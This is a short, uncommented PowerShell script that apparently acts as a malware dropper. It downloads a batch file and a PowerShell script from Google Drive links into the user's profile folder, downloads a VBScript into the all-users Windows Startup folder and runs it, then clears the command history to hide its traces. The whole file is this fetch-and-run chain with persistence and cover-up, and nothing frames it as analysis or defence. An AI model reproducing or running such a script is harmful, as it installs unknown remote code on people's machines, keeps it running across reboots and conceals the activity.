cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1XPfldT3Wo41jCj1_1QEQNtbaO3ygvOA8" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1_BBPU4fExOENxeXL_5z9n1POLGG2yLY7" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=11oNzWAGriOfY_fxq6AnZjSWk_CZK3Pdb" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit
